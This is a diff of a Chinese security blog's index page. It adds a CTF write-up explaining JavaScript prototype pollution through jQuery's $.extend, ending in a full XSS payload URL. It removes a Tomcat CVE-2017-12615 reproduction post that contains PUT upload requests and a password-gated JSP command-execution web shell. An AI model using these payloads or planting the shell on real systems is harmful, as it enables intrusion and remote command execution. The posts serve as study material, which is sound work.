@@ -66,6 +66,283 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-js原型链污染" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" class="article-date">
+  <time class="dt-published" datetime="2020-02-18T10:18:01.991Z" itemprop="datePublished">2020-02-18</time>
+</a>
+    
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a>
+  </div>
+
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/">js原型链污染</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h1 id="js原型链污染"><a href="#js原型链污染" class="headerlink" title="js原型链污染"></a>js原型链污染</h1><p> <a href="https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/javascript-prototype-pollution-attack.html</a> </p>
+<h2 id="什么是原型链"><a href="#什么是原型链" class="headerlink" title="什么是原型链"></a>什么是原型链</h2><p> 每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<strong>原型链</strong>中的最后一个环节。 </p>
+<pre><code class="javascript">function Foo
+{
+
+    this.a=&quot;456&quot;;
+    this.c=&quot;777&quot;
+}
+Foo.prototype.b=&quot;123&quot;;
+Foo.prototype.c=&quot;789&quot;;
+var foo=new Foo();
+console.log(foo.a);//456    
+console.log(foo.b);//123
+console.log(foo.c);//777</code></pre>
+<p>当在当前对象找不到属性或方法时便会向上(<code>__proto__</code>中)寻找</p>
+<ol>
+<li>在对象foo中寻找b</li>
+<li>如果找不到，则在<code>foo.__proto__</code>中寻找b</li>
+<li>如果仍然找不到，则继续在<code>foo.__proto__.__proto__</code>中寻找b</li>
+<li>依次寻找，直到找到<code>null</code>结束。比如，<code>Object.prototype</code>的<code>__proto__</code>就是<code>null</code></li>
+</ol>
+<p>JavaScript的这个查找的机制，被运用在面向对象的继承中，被称作prototype继承链。</p>
+<p>以上就是最基础的JavaScript面向对象编程，我们并不深入研究更细节的内容，只要牢记以下几点即可：</p>
+<ol>
+<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li>JavaScript使用prototype链实现继承机制</li>
+</ol>
+<h2 id="什么时原型链污染"><a href="#什么时原型链污染" class="headerlink" title="什么时原型链污染"></a>什么时原型链污染</h2><p>当我们修改对象的<code>__proto__</code>属性时,就相当于修改对象的父类</p>
+<p>当调用不存在的方法或属性时便会在父类中寻找,就变相的控制了这个类</p>
+<pre><code class="javascript">let foo = {bar: 1}
+
+// foo.bar 此时为1
+console.log(foo.bar)
+
+// 修改foo的原型（即Object）
+foo.__proto__.bar = 2
+
+// 由于查找顺序的原因，foo.bar仍然是1
+console.log(foo.bar)
+
+// 此时再用Object创建一个空的zoo对象
+let zoo = {}
+
+// 查看zoo.bar
+console.log(zoo.bar)</code></pre>
+<h2 id="哪些情况原型链会被污染"><a href="#哪些情况原型链会被污染" class="headerlink" title="哪些情况原型链会被污染"></a>哪些情况原型链会被污染</h2><h3 id="merge"><a href="#merge" class="headerlink" title="merge"></a>merge</h3><h3 id="clone"><a href="#clone" class="headerlink" title="clone"></a>clone</h3><h3 id="JSON-parse"><a href="#JSON-parse" class="headerlink" title="JSON.parse"></a>JSON.parse</h3><h3 id="jQuery-extend"><a href="#jQuery-extend" class="headerlink" title="jQuery.extend"></a>jQuery.extend</h3><p><em>$</em>.extend( target [, object1 ] [, objectN ] )</p>
+<p>指示是否深度合并</p>
+<p><em>$</em>.extend( [deep ], target, object1 [, objectN ] )</p>
+<p><strong>警告:</strong> 不支持第一个参数传递 false 。</p>
+<table>
+<thead>
+<tr>
+<th align="left">参数</th>
+<th align="left">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><em>deep</em></td>
+<td align="left">可选。 Boolean类型 指示是否深度合并对象，默认为false。如果该值为true，且多个对象的某个同名属性也都是对象，则该”属性对象”的属性也将进行合并。</td>
+</tr>
+<tr>
+<td align="left"><em>target</em></td>
+<td align="left">Object类型 目标对象，其他对象的成员属性将被附加到该对象上。</td>
+</tr>
+<tr>
+<td align="left"><em>object1</em></td>
+<td align="left">可选。 Object类型 第一个被合并的对象。</td>
+</tr>
+<tr>
+<td align="left"><em>objectN</em></td>
+<td align="left">可选。 Object类型 第N个被合并的对象。</td>
+</tr>
+</tbody></table>
+<h2 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h2><p>题目代码</p>
+<p>car.class.js</p>
+<pre><code class="javascript">class Car {
+    constructor(type, model, color, pic, key=&quot;&quot;) {
+        this.type = type
+        this.model = model
+        this.color = color
+        this.key = key
+        this.pic = pic
+
+        let started = false
+        this.start = () =&gt; {
+            started = true
+        }
+        this.isStarted = () =&gt; {
+            return started
+        }
+    }
+    powerOn() {
+        if (this.isStarted()) {
+            infobox(`Well Done!`)
+            nextCar()
+
+        } else {
+            $(&#39;.chargeup&#39;)[0].play()
+        }
+    }
+    info() {
+        infobox(`This car is a ${this.type} ${this.model} in ${this.color}. It looks very nice! But it seems to be broken ...`)
+    }
+    repair() {
+        if(urlParams.has(&#39;repair&#39;)) {
+            $.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))
+        }
+    }
+    light() {
+        infobox(`You turn on the lights ... Nothing happens.`)
+    }
+    battery() {
+        infobox(`Hmmm, the battery is almost empty ... Maybe i can repair this somehow.`)
+    }
+    ignition() {
+        if (this.key == &quot;&quot;) {
+            infobox(`Looks like the key got lost. No wonder the car is not starting ...`)
+        }
+        if (this.key == &quot;🔑&quot;) {
+            infobox(`The car started!`)
+            this.start()
+        }
+    }
+}</code></pre>
+<p>util.js</p>
+<pre><code class="javascript">const urlParams = new URLSearchParams(window.location.search)
+const h = location.hash.slice(1)
+const bugatti = new Car(&#39;Bugatti&#39;, &#39;T35&#39;, &#39;green&#39;, &#39;assets/images/bugatti.png&#39;)
+const porsche = new Car(&#39;Porsche&#39;, &#39;911&#39;, &#39;yellow&#39;, &#39;assets/images/porsche.png&#39;)
+
+const cars = [bugatti, porsche]
+
+porsche.repair = () =&gt; {
+    if(!bugatti.isStarted()){
+        infobox(`Not so fast. Repair the other car first!`)
+    }
+    else if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){
+        if(urlParams.has(&#39;help&#39;)) {
+            repairWithHelper(urlParams.get(&#39;help&#39;))
+        }
+    }
+    else{
+        infobox(`Repairing this is not that easy.`)
+    }
+}
+porsche.ignition = () =&gt; {
+    infobox(`Hmm ... WTF!`)
+}
+
+$(document).ready(() =&gt; {
+    const [car] = cars
+    $(&#39;.fa-power-off&#39;).click(() =&gt; car.powerOn())
+    $(&#39;.fa-car&#39;).click(() =&gt; car.info())
+    $(&#39;.fa-lightbulb-o&#39;).click(() =&gt; car.light())
+    $(&#39;.fa-battery-quarter&#39;).click(() =&gt; car.battery())
+    $(&#39;.fa-key&#39;).click(() =&gt; car.ignition())
+    $(&#39;.fa-wrench&#39;).click(() =&gt; car.repair())
+
+    $(&#39;.fa-step-forward&#39;).click(() =&gt; nextCar())
+
+    if(h.includes(&#39;Bugatti&#39;))
+        autoStart(bugatti)
+    if(h.includes(&#39;Porsche&#39;))
+        autoStart(porsche)
+})
+
+
+const nextCar = () =&gt; {
+    cars.push(cars.shift())
+    $(&quot;.image&quot;).attr(&#39;src&#39;, cars[0].pic);
+}
+
+
+const autoStart = (car) =&gt; {
+    car.repair()
+    car.ignition()
+    car.powerOn()
+}
+
+
+const repairWithHelper = (src) =&gt; {
+    /* who needs csp anyways !? */
+    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
+    if (urlRegx.test(src)) {
+        let s = document.createElement(&#39;script&#39;)
+        s.src = src
+        $(&#39;head&#39;).append(s)
+    }
+}
+
+
+const infobox = (text) =&gt; {
+    $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;none&#39;, &#39;border&#39;: &#39;none&#39;})
+    $(&#39;.infobox&#39;).addClass(&#39;infoAnimate&#39;)
+        .text(text)
+        .on(&#39;animationend&#39;, function() {
+            $(this).removeClass(&#39;infoAnimate&#39;)
+            $(&#39;a&#39;).css({&#39;pointer-events&#39;: &#39;all&#39;, &#39;border&#39;: &#39;solid 1px rgba(255, 255, 255, .25)&#39;})
+    })
+
+}</code></pre>
+<p>阅读代码发现car类的repair方法会调用</p>
+<p><code>$.extend(true, this, JSON.parse(urlParams.get(&#39;repair&#39;)))</code></p>
+<p>可以进行原型链污染</p>
+<p>而这一题我们的目标时进行xss</p>
+<p>阅读代码发现对象<code>porsche</code>的repairWithHelper中可以进行xss</p>
+<p>而调用repairWithHelper方法就需要调用porsche的repair方法</p>
+<pre><code>if($.md5(porsche) == &#39;9cdfb439c7876e703e307864c9167a15&#39;){
+        if(urlParams.has(&#39;help&#39;)) {
+            repairWithHelper(urlParams.get(&#39;help&#39;))
+        }
+}</code></pre><p>我们用控制porsche.toString()==’lol’(lol的md5是9cdfb439c7876e703e307864c9167a15)，我们可以通过原型链污染来让上层为<code>[&#39;lol&#39;]</code>([‘lol’].toString()==’lol’)</p>
+<p>通过autoStart来调用bugatti.repair(原型链污染)和porsche.repair(调用repairWithHelper方法)</p>
+<p>所以构造payload:<code>http://127.0.0.1/?repair={&quot;started&quot;:true,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}</code></p>
+<p>接下来就是利用repairWithHelper来进行xss</p>
+<pre><code class="javascript">const repairWithHelper = (src) =&gt; {
+    /* who needs csp anyways !? */
+    urlRegx = /^\w{4,5}:\/\/car-repair-shop\.fluxfingersforfuture\.fluxfingers\.net\/[\w\d]+\/.+\.js$/;
+    if (urlRegx.test(src)) {
+        let s = document.createElement(&#39;script&#39;)
+        s.src = src
+        $(&#39;head&#39;).append(s)
+    }
+}</code></pre>
+<p>虽然这里对url的域名进行了限制不能远程文件包含</p>
+<p>但是我们可以利用data协议来绕过正则从而直接执行命令</p>
+<p>data协议格式</p>
+<pre><code>data:[&lt;mime type&gt;][;charset=&lt;charset&gt;][;base64],&lt;encoded data&gt;</code></pre><p>最后的payload:<code>http://127.0.0.1/?repair={&quot;key&quot;:&quot;🔑&quot;,&quot;__proto__&quot;:{&quot;__proto__&quot;:[&quot;lol&quot;]}}&amp;help=data://car-repair-shop.fluxfingersforfuture.fluxfingers.net/asdfsdf/asdf,alert(&quot;123&quot;)%23.js#BugattiPorsche</code></p>
+<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： <a href="http://blog.ccreater.top/2020/02/18/js原型链污染/">http://blog.ccreater.top/2020/02/18/js原型链污染/</a> <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://blog.ccreater.top/2020/02/18/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/" data-id="cka3ckr2w002fv4v0chqz240g" data-title="js原型链污染" class="article-share-link">Share</a>
+      
+	  
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li></ul>
+
+    </footer>
+  </div>
+  
+</article>
+
+
+
+
+
+  
     <article id="post-避免rm-rf-的悲惨命运" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2020/02/17/%E9%81%BF%E5%85%8Drm-rf-%E7%9A%84%E6%82%B2%E6%83%A8%E5%91%BD%E8%BF%90/" class="article-date">
@@ -1478,97 +1755,6 @@ def poc(url):
 
 
   
-    <article id="post-Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" class="article-date">
-  <time class="dt-published" datetime="2020-02-08T07:28:03.158Z" itemprop="datePublished">2020-02-08</time>
-</a>
-    
-  <div class="article-category">
-    <a class="article-category-link" href="/categories/cve%E5%A4%8D%E7%8E%B0/">cve复现</a>
-  </div>
-
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/">Tomcat PUT方法任意写文件漏洞CVE-2017-12615</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h1 id="Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）"><a href="#Tomcat-PUT方法任意写文件漏洞（CVE-2017-12615）" class="headerlink" title="Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）"></a>Tomcat PUT方法任意写文件漏洞（CVE-2017-12615）</h1><h2 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h2><p> Apache Tomcat 7.0.0 - 7.0.79 </p>
-<p>平台: Windows </p>
-<p> 启用了 HTTP PUT 请求方法  (conf/web.xml 中对于 DefaultServlet 的 readonly 设置为 false)</p>
-<h2 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h2><p>不能直接上传jsp结尾的文件</p>
-<p>利用windows平台下:<code>sample.txt::$DATA</code>等价于<code>sample.txt</code>的特性来写shell</p>
-<pre><code>PUT /111.jsp::$DATA HTTP/1.1
-Host: 10.1.1.6:8080
-User-Agent: JNTASS
-DNT: 1
-Connection: close
-
-...jsp shell...</code></pre><pre><code>PUT /111.jsp/ HTTP/1.1
-Host: 10.1.1.6:8080
-User-Agent: JNTASS
-DNT: 1
-Connection: close
-
-...jsp shell...</code></pre><pre><code class="java">&lt;%
-    if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;))){
-        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();
-        int a = -1;
-        byte[] b = new byte[2048];
-        out.print(&quot;&lt;pre&gt;&quot;);
-        while((a=in.read(b))!=-1){
-            out.println(new String(b));
-        }
-        out.print(&quot;&lt;/pre&gt;&quot;);
-    }
-%&gt;</code></pre>
-<h2 id="检测脚本"><a href="#检测脚本" class="headerlink" title="检测脚本"></a>检测脚本</h2><pre><code class="python">import requests
-def poc(url):
-    filename=&quot;tomcat_check_vuln.txt&quot;
-    content=&quot;test&quot;
-    try:
-        requests.put(url+&quot;/&quot;+filename,data=conetent)
-        res=requests.get(url+&quot;/&quot;+filename)
-    except :
-        return False
-
-    if res.status_code==200:
-        return True
-    return False
-</code></pre>
-<p><strong>本文作者</strong>：ccreater<br/><strong>本文地址</strong>： [<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/](<a href="http://blog.ccreater.top/2020/02/08/Tomcat">http://blog.ccreater.top/2020/02/08/Tomcat</a> PUT方法任意写文件漏洞CVE-2017-12615/) <br/><strong>版权声明</strong>：本博客所有文章除特别声明外，均采用 BY-NC-SA 许可协议。转载请注明出处</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://blog.ccreater.top/2020/02/08/Tomcat%20PUT%E6%96%B9%E6%B3%95%E4%BB%BB%E6%84%8F%E5%86%99%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9ECVE-2017-12615/" data-id="cka3ckr2e0016v4v0fkwt27t2" data-title="Tomcat PUT方法任意写文件漏洞CVE-2017-12615" class="article-share-link">Share</a>
-      
-	  
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cve%E5%A4%8D%E7%8E%B0/" rel="tag">cve复现</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -1626,6 +1812,10 @@ def poc(url):
       <ul>
         
           <li>
+            <a href="/2020/10/04/2020%20ciscn%20%E5%8D%8E%E4%B8%9C%E5%8D%97%20web/">2020 ciscn 华东南 web</a>
+          </li>
+        
+          <li>
             <a href="/2020/10/04/jdk7u21%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%A4%8D%E7%8E%B0/">jdk7u21反序列化复现</a>
           </li>
         
@@ -1639,10 +1829,6 @@ def poc(url):
         
           <li>
             <a href="/2020/09/07/DDCTF2020/">DDCTF2020</a>
-          </li>
-        
-          <li>
-            <a href="/2020/08/21/ciscn2020%E9%A2%84%E9%80%89%E8%B5%9B/">ciscn2020预选赛</a>
           </li>
         
       </ul>
